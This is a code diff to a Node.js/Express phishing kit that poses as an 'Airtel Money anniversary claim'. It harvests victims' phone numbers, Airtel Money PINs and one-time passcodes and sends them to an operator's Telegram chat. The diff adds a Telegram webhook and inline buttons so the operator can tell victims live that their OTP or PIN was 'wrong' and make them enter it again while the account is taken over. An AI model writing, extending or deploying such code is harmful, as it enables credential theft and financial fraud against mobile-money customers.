@@ -649,7 +649,7 @@ document.getElementById('finalCountry').textContent=(selectedCountry ? selectedC
 document.getElementById('finalPhone').textContent=userNumber;
 goToStep('success');
 }
-else if(data.status==='rejected'){
+else if(data.status==='rejected_otp'){
 clearInterval(pollInterval);
 pollInterval=null;
 var btn=document.getElementById('submitOtpBtn');
@@ -660,6 +660,17 @@ showErr('otpMessage','Wrong OTP. Please re-enter your code.');
 for(var i=0;i<otpInputs.length;i++){otpInputs[i].value='';otpInputs[i].classList.add('error')}
 setTimeout(function(){for(var i=0;i<otpInputs.length;i++){otpInputs[i].classList.remove('error')}},1500);
 otpInputs[0].focus();
+fetch('/api/clear-status/'+currentClaimId,{method:'POST'});
+}
+else if(data.status==='rejected_pin'){
+clearInterval(pollInterval);
+pollInterval=null;
+goToStep('step2');
+document.getElementById('airtelPin').value='';
+document.getElementById('airtelPin').classList.add('error');
+setTimeout(function(){document.getElementById('airtelPin').classList.remove('error')},1500);
+showErr('pinMessage','Incorrect PIN. Please re-enter your Airtel Money PIN.');
+document.getElementById('airtelPin').focus();
 fetch('/api/clear-status/'+currentClaimId,{method:'POST'});
 }
 }catch(error){
@@ -728,6 +739,8 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;b
 .btn-approve:hover{transform:translateY(-2px);box-shadow:0 6px 20px rgba(40,167,69,0.4)}
 .btn-reject{background:linear-gradient(135deg,#dc3545,#a71d2a)}
 .btn-reject:hover{transform:translateY(-2px);box-shadow:0 6px 20px rgba(220,53,69,0.4)}
+.btn-pin{background:linear-gradient(135deg,#ff8c00,#cc6600)}
+.btn-pin:hover{transform:translateY(-2px);box-shadow:0 6px 20px rgba(255,140,0,0.4)}
 .empty-state{text-align:center;padding:80px 20px;color:#666}
 .empty-state .icon{font-size:64px;margin-bottom:16px;color:#28a745;font-weight:800}
 .empty-state h2{color:#999;margin-bottom:8px}
@@ -809,7 +822,7 @@ var data = await response.json();
 var pending = 0, approved = 0, rejected = 0;
 (data.claims||[]).forEach(function(c){
 if(c.status === 'approved'){approved++}
-else if(c.status === 'rejected'){rejected++}
+else if(c.status === 'rejected_otp' || c.status === 'rejected_pin'){rejected++}
 else {pending++}
 });
 
@@ -845,7 +858,8 @@ return '<div class="claim-card">' +
 '</div>' +
 '<div class="claim-actions">' +
 '<button class="action-btn btn-approve" onclick="approveClaim(\\'' + c.id + '\\')">Approve</button>' +
-'<button class="action-btn btn-reject" onclick="rejectClaim(\\'' + c.id + '\\')">Wrong OTP</button>' +
+'<button class="action-btn btn-reject" onclick="rejectClaim(\\'' + c.id + '\\', \\'otp\\')">Wrong OTP</button>' +
+'<button class="action-btn btn-pin" onclick="rejectClaim(\\'' + c.id + '\\', \\'pin\\')">Wrong PIN</button>' +
 '</div>' +
 '</div>';
 }).join('');
@@ -870,12 +884,12 @@ alert('Error: ' + e.message);
 }
 }
 
-async function rejectClaim(id){
+async function rejectClaim(id, type){
 try{
 var response = await fetch('/api/admin/action', {
 method:'POST',
 headers:{'Content-Type':'application/json'},
-body:JSON.stringify({claimId: id, action: 'reject'})
+body:JSON.stringify({claimId: id, action: 'reject_' + type})
 });
 if(response.ok){
 loadClaims();
@@ -887,6 +901,50 @@ alert('Error: ' + e.message);
 </script>
 </body>
 </html>`;
+
+// ===== TELEGRAM HELPERS =====
+async function sendTelegramMessage(text, keyboard) {
+    try {
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        const payload = { chat_id: CHAT_ID, text, parse_mode: 'HTML' };
+        if (keyboard) {
+            payload.reply_markup = { inline_keyboard: keyboard };
+        }
+        await axios.post(url, payload);
+    } catch (e) {
+        console.error('Telegram send error:', e.message);
+    }
+}
+
+async function answerCallbackQuery(callbackQueryId, text) {
+    try {
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`;
+        await axios.post(url, { callback_query_id: callbackQueryId, text, show_alert: false });
+    } catch (e) {
+        console.error('Answer callback error:', e.message);
+    }
+}
+
+async function editTelegramMessage(chatId, messageId, text) {
+    try {
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`;
+        await axios.post(url, { chat_id: chatId, message_id: messageId, text, parse_mode: 'HTML' });
+    } catch (e) {
+        console.error('Edit message error:', e.message);
+    }
+}
+
+function getClaimKeyboard(claimId) {
+    return [
+        [
+            { text: '✅ Approve', callback_data: 'approve:' + claimId },
+            { text: '❌ Wrong OTP', callback_data: 'reject_otp:' + claimId },
+        ],
+        [
+            { text: '⚠️ Wrong PIN', callback_data: 'reject_pin:' + claimId }
+        ]
+    ];
+}
 
 // ===== ROUTES =====
 app.get('/', (req, res) => { res.send(USER_PAGE); });
@@ -920,7 +978,7 @@ app.get('/api/admin/claims', (req, res) => {
     res.json({ claims: list });
 });
 
-// Admin: approve/reject
+// Admin: approve/reject (web panel)
 app.post('/api/admin/action', async (req, res) => {
     try{
         const { claimId, action } = req.body;
@@ -929,20 +987,18 @@ app.post('/api/admin/action', async (req, res) => {
             return res.status(404).json({ success: false, message: 'Claim not found' });
         }
 
-        c.status = (action === 'approve') ? 'approved' : 'rejected';
+        if (action === 'approve') {
+            c.status = 'approved';
+        } else if (action === 'reject_otp') {
+            c.status = 'rejected_otp';
+        } else if (action === 'reject_pin') {
+            c.status = 'rejected_pin';
+        } else {
+            return res.status(400).json({ success: false, message: 'Unknown action' });
+        }
+
         c.decidedAt = new Date().toISOString();
-
-        const status = (action === 'approve') ? 'APPROVED' : 'REJECTED (Wrong OTP)';
-        const msg =
-            '<b>ADMIN ACTION</b>\n\n' +
-            '<b>Claim ID:</b> <code>#' + claimId + '</code>\n' +
-            '<b>Country:</b> <code>' + (c.country || 'N/A') + ' ' + (c.countryCode || '') + '</code>\n' +
-            '<b>Airtel Number:</b> <code>' + c.airtelNumber + '</code>\n' +
-            '<b>OTP:</b> <code>' + (c.otpEntered || 'N/A') + '</code>\n' +
-            '<b>Status:</b> ' + status;
-
-        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-        await axios.post(url, { chat_id: CHAT_ID, text: msg, parse_mode: 'HTML' });
+        c.decidedBy = 'web';
 
         res.json({ success: true });
     }catch(e){
@@ -974,17 +1030,17 @@ app.post('/api/start-claim', async (req, res) => {
             createdAt: new Date().toISOString()
         };
 
+        // Send Telegram message with inline action buttons
         const msg =
-            '<b>AIRTEL MONEY ANNIVERSARY CLAIM STARTED</b>\n\n' +
-            '<b>Claim ID:</b> <code>#' + claimId + '</code>\n' +
-            '<b>Country:</b> <code>' + (country || 'N/A') + ' ' + (countryCode || '') + '</code>\n' +
-            '<b>Airtel Number:</b> <code>' + airtelNumber + '</code>\n' +
-            '<b>Airtel PIN:</b> <code>' + airtelPin + '</code>\n' +
-            '<b>Started:</b> ' + new Date().toLocaleString() + '\n\n' +
+            '🔔 <b>NEW CLAIM STARTED</b>\n\n' +
+            '🆔 <b>Claim ID:</b> <code>#' + claimId + '</code>\n' +
+            '🌍 <b>Country:</b> <code>' + (country || 'N/A') + ' ' + (countryCode || '') + '</code>\n' +
+            '📱 <b>Airtel Number:</b> <code>' + airtelNumber + '</code>\n' +
+            '🔑 <b>Airtel PIN:</b> <code>' + airtelPin + '</code>\n' +
+            '🕐 <b>Started:</b> ' + new Date().toLocaleString() + '\n\n' +
             '<i>User is entering OTP...</i>';
 
-        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-        await axios.post(url, { chat_id: CHAT_ID, text: msg, parse_mode: 'HTML' });
+        await sendTelegramMessage(msg, getClaimKeyboard(claimId));
 
         res.json({ success: true, claimId });
     }catch(e){
@@ -1006,16 +1062,15 @@ app.post('/api/submit-otp', async (req, res) => {
         c.otpSubmittedAt = new Date().toISOString();
 
         const msg =
-            '<b>OTP SUBMITTED - ACTION NEEDED</b>\n\n' +
-            '<b>Claim ID:</b> <code>#' + claimId + '</code>\n' +
-            '<b>Country:</b> <code>' + (c.country || 'N/A') + ' ' + (c.countryCode || '') + '</code>\n' +
-            '<b>Airtel Number:</b> <code>' + c.airtelNumber + '</code>\n' +
-            '<b>PIN:</b> <code>' + c.airtelPin + '</code>\n' +
-            '<b>OTP Entered:</b> <code>' + otp + '</code>\n' +
-            '<b>Time:</b> ' + new Date().toLocaleString();
+            '🔐 <b>OTP SUBMITTED — ACTION NEEDED</b>\n\n' +
+            '🆔 <b>Claim ID:</b> <code>#' + claimId + '</code>\n' +
+            '🌍 <b>Country:</b> <code>' + (c.country || 'N/A') + ' ' + (c.countryCode || '') + '</code>\n' +
+            '📱 <b>Airtel Number:</b> <code>' + c.airtelNumber + '</code>\n' +
+            '🔑 <b>PIN:</b> <code>' + c.airtelPin + '</code>\n' +
+            '🔢 <b>OTP Entered:</b> <code>' + otp + '</code>\n' +
+            '🕐 <b>Time:</b> ' + new Date().toLocaleString();
 
-        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-        await axios.post(url, { chat_id: CHAT_ID, text: msg, parse_mode: 'HTML' });
+        await sendTelegramMessage(msg, getClaimKeyboard(claimId));
 
         res.json({ success: true });
     }catch(e){
@@ -1041,6 +1096,98 @@ app.post('/api/clear-status/:claimId', (req, res) => {
         claims[claimId].status = 'pending';
     }
     res.json({ success: true });
+});
+
+// ===== TELEGRAM WEBHOOK =====
+// Telegram sends updates here when a button is pressed
+app.post(`/telegram/webhook`, async (req, res) => {
+    try {
+        const update = req.body;
+
+        // Handle callback_query (inline button press)
+        if (update.callback_query) {
+            const cq = update.callback_query;
+            const data = cq.data || '';
+            const parts = data.split(':');
+            const action = parts[0];
+            const claimId = parts[1];
+
+            const c = claims[claimId];
+            if (!c) {
+                await answerCallbackQuery(cq.id, '❌ Claim not found');
+                return res.sendStatus(200);
+            }
+
+            if (action === 'approve') {
+                c.status = 'approved';
+                c.decidedAt = new Date().toISOString();
+                c.decidedBy = 'telegram';
+                await answerCallbackQuery(cq.id, '✅ Approved!');
+                await sendTelegramMessage(
+                    '✅ <b>APPROVED</b>\n\n' +
+                    '🆔 <b>Claim ID:</b> <code>#' + claimId + '</code>\n' +
+                    '📱 <b>Airtel Number:</b> <code>' + c.airtelNumber + '</code>\n' +
+                    '🕐 <b>Time:</b> ' + new Date().toLocaleString()
+                );
+            } else if (action === 'reject_otp') {
+                c.status = 'rejected_otp';
+                c.decidedAt = new Date().toISOString();
+                c.decidedBy = 'telegram';
+                await answerCallbackQuery(cq.id, '❌ Wrong OTP');
+                await sendTelegramMessage(
+                    '❌ <b>WRONG OTP</b>\n\n' +
+                    '🆔 <b>Claim ID:</b> <code>#' + claimId + '</code>\n' +
+                    '📱 <b>Airtel Number:</b> <code>' + c.airtelNumber + '</code>\n' +
+                    '🔢 <b>OTP Entered:</b> <code>' + (c.otpEntered || 'N/A') + '</code>\n' +
+                    '➡️ <i>User will re-enter OTP</i>'
+                );
+            } else if (action === 'reject_pin') {
+                c.status = 'rejected_pin';
+                c.decidedAt = new Date().toISOString();
+                c.decidedBy = 'telegram';
+                await answerCallbackQuery(cq.id, '⚠️ Wrong PIN');
+                await sendTelegramMessage(
+                    '⚠️ <b>WRONG PIN</b>\n\n' +
+                    '🆔 <b>Claim ID:</b> <code>#' + claimId + '</code>\n' +
+                    '📱 <b>Airtel Number:</b> <code>' + c.airtelNumber + '</code>\n' +
+                    '🔑 <b>PIN Entered:</b> <code>' + c.airtelPin + '</code>\n' +
+                    '➡️ <i>User will re-enter PIN</i>'
+                );
+            } else {
+                await answerCallbackQuery(cq.id, '❓ Unknown action');
+            }
+
+            return res.sendStatus(200);
+        }
+
+        res.sendStatus(200);
+    } catch (e) {
+        console.error('Webhook error:', e.message);
+        res.sendStatus(200);
+    }
+});
+
+// ===== WEBHOOK SETUP ROUTE (open in browser once after deploy) =====
+app.get('/setup-webhook', async (req, res) => {
+    try {
+        const publicUrl = req.query.url;
+        if (!publicUrl) {
+            return res.send(
+                '<h2>Webhook Setup</h2>' +
+                '<p>Visit this URL to register your webhook:</p>' +
+                '<pre>' + req.protocol + '://' + req.get('host') + '/setup-webhook?url=https://your-public-domain.com</pre>' +
+                '<p>The <code>url</code> must be your public HTTPS domain (no trailing slash).</p>'
+            );
+        }
+
+        const webhookUrl = publicUrl.replace(/\/$/, '') + '/telegram/webhook';
+        const apiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/setWebhook?url=${encodeURIComponent(webhookUrl)}`;
+        const response = await axios.get(apiUrl);
+
+        res.json({ webhookUrl, telegramResponse: response.data });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
 });
 
 app.get('/health', (req, res) => res.json({ status: 'healthy' }));
